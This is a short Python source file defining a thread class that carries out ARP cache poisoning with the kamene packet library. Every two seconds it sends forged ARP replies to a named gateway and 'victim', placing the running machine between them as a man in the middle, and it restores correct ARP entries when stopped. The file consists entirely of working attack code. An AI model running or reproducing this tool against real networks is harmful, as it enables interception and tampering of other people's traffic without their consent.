from threading import Thread
import time

from HMGeneric.internetProtocol import ArpObj

from kamene.sendrecv import send
from kamene.layers.l2 import ARP

class arpThread(Thread):
    def __init__(self, gateway, victim):
        Thread.__init__(self)
        self.name = 'Arp posion thread'
        self.gateway : ArpObj = gateway
        self.victim : ArpObj = victim
        self.boolPosion = True
    
    def run(self):
        self.boolPosion = True
        while(self.boolPosion):
            send(ARP(op=2, pdst=self.gateway.IPAddress, hwdst=self.gateway.MACAddress, psrc=self.victim.IPAddress), verbose = False)
            send(ARP(op=2, pdst=self.victim.IPAddress, hwdst=self.victim.MACAddress, psrc=self.gateway.IPAddress), verbose=False)
            time.sleep(2)
        self.restore_network()
    
    def stop_posion(self):
        self.boolPosion = False
    
    def restore_network(self):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway.IPAddress, hwsrc=self.victim.MACAddress, psrc=self.victim.IPAddress), count=5, verbose=False)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.victim.IPAddress, hwsrc=self.gateway.MACAddress, psrc=self.gateway.IPAddress), count=5, verbose=False)